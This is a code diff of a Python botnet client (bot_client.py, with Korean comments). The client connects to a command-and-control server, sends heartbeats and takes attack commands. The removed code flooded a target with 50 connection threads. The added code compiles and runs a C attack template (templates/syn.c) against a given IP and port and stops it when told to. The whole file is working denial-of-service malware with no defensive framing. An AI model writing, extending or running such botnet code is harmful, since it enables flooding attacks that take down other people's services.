@@ -1,11 +1,41 @@
 # bot_client.py
-import socket, threading, time, random
-import os
+import socket, threading, time, subprocess, os
 
-CNC_IP = "192.168.0.100"
+CNC_IP = '192.168.0.100'
 CNC_PORT = 9001
 
-def send_heartbeat(sock):
+current_process = None  # 공격 서브프로세스를 추적
+
+def connect_to_cnc():
+    global current_process
+
+    while True:
+        try:
+            sock = socket.socket()
+            sock.connect((CNC_IP, CNC_PORT))
+            ip = sock.getsockname()[0]
+            sock.send(f"hello {ip}".encode())
+
+            threading.Thread(target=heartbeat, args=(sock,), daemon=True).start()
+
+            while True:
+                data = sock.recv(1024).decode().strip()
+                if data.startswith("attack"):
+                    _, method, ip, port = data.split()
+                    with open("bot_attack.c", "w") as f:
+                        f.write(get_c_source_code(method))
+                    subprocess.run(["gcc", "bot_attack.c", "-o", "attack_exec"])
+                    current_process = subprocess.Popen(["./attack_exec", ip, port])
+                elif data == "stop":
+                    if current_process:
+                        current_process.terminate()
+                        sock.send(b"done stop")
+                        current_process = None
+
+        except Exception as e:
+            time.sleep(5)
+
+def heartbeat(sock):
     while True:
         try:
             sock.send(b"heartbeat")
@@ -13,39 +43,10 @@ def send_heartbeat(sock):
             break
         time.sleep(3)
 
-def syn_flood(target_ip, target_port):
-    try:
-        while True:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(1)
-            s.connect((target_ip, target_port))
-            s.close()
-    except:
-        pass
-
-def handle_command(sock):
-    while True:
-        try:
-            data = sock.recv(1024).decode()
-            if data.startswith("attack"):
-                _, method, ip, port = data.split()
-                port = int(port)
-                if method == "syn":
-                    for _ in range(50):  # 쓰레드 수
-                        threading.Thread(target=syn_flood, args=(ip, port), daemon=True).start()
-        except:
-            break
-
-def connect_to_cnc():
-    while True:
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((CNC_IP, CNC_PORT))
-            sock.send(b"hello")
-            threading.Thread(target=send_heartbeat, args=(sock,), daemon=True).start()
-            handle_command(sock)
-        except Exception as e:
-            time.sleep(5)
+def get_c_source_code(method):
+    if method == "syn":
+        return open("templates/syn.c").read()
+    return "// unknown attack"
 
 if __name__ == "__main__":
     connect_to_cnc()
